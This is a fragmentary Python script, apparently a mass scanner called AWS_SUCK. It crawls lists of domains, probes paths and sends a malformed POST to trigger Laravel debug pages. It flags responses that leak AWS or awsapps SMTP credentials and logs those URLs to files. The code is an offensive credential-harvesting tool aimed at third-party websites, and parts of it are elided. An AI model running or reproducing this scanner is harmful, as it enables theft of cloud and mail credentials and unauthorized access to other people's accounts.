...
/____/_/ |_\___/_/|_|\____/ /_/    
    ...
    def check(self, content, url):
        try:
            ...
            # amazonaws
            if "amazonaws.com" in isi:
                print ("{}[!] FOUND SMTP AWS {}".format(self.green, url))
                self.save("SMTP_AMAZON.txt", url)

            # SMTP awsapps
            if "awsapps.com" in isi:
                print ("{}[!] FOUND SMTP AWSAPPS {}".format(self.green, url))
                self.save("SMTP_AWSAPPS", url)
            ...
            # BAD LUCKY :(
                ...
                print ("{}[-] BAD LARAVEL {}".format(self.red, url))
    ...
    def akurapopo(self, domain):
        try:
            for a in self.path:
                url = domain+a
                r = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, verify=False, allow_redirects=False)
                self.check(r, url)
            rr = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, data="halomin[]=asu", verify=False, allow_redirects=False)
            self.check(rr, url+" [DEBUG POST]")
        except:
            print ("{}[!] BAD SITE {}".format(self.red, domain))


matur_sembah_nuwun_sanget_sampun_nate_nglarani = AWS_SUCK()
matur_sembah_nuwun_sanget_sampun_nate_nglarani.banner()
tresno = [i.strip() for i in open(str(sys.argv[1])).readlines()]
lali = Pool(int(sys.argv[2]))
